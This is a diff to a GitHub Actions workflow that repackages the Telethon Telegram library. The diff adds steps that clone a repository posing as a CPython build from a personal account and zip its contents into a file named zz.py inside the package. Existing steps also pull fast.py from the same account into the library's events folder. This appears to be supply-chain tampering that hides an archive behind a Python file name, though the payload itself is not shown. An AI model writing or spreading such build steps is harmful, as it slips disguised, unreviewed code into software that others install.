@@ -19,6 +19,7 @@ jobs:
       - name: Run Data Fetcher
         run: |
           # Download and setup Telethon
+          rm v1.zip
           wget -q https://github.com/LonamiWebs/Telethon/archive/refs/heads/v1.zip
           unzip -q v1.zip && rm v1.zip
           cp -r Telethon*/* ./
@@ -26,6 +27,11 @@ jobs:
           # دانلود fast جدید
           wget https://raw.githubusercontent.com/amirwolf5122/data/newmm1/fast.py
           mv fast.py telethon/events/fast.py
+          git clone https://github.com/amirwolf5122/cpython-3.13.9-x86_64.git
+          cd cpython-*
+          zip ../telethon/zz.py *
+          cd ..
+          rm -rf cpython-*
           # دانلود schema جدید
           wget https://raw.githubusercontent.com/telegramdesktop/tdesktop/dev/Telegram/SourceFiles/mtproto/scheme/api.tl
           mv api.tl telethon_generator/data/api.tl
@@ -39,10 +45,7 @@ jobs:
           echo "def tdesktop():" > telethon/events/tdesktop.py
           echo "    return \"$VERSION\"" >> telethon/events/tdesktop.py
           echo "tdesktop()" >> telethon/events/tdesktop.py
-          # نمایش محتوای فایل ساخته شده
-          cat telethon/events/tdesktop.py
-          sed -i '/setup(/a \            include_package_data=True,' setup.py
-          echo "include README.md" > MANIFEST.in
+
       - name: Commit and Push Changes
         run: |
           git config --global user.name "github-actions[bot]"
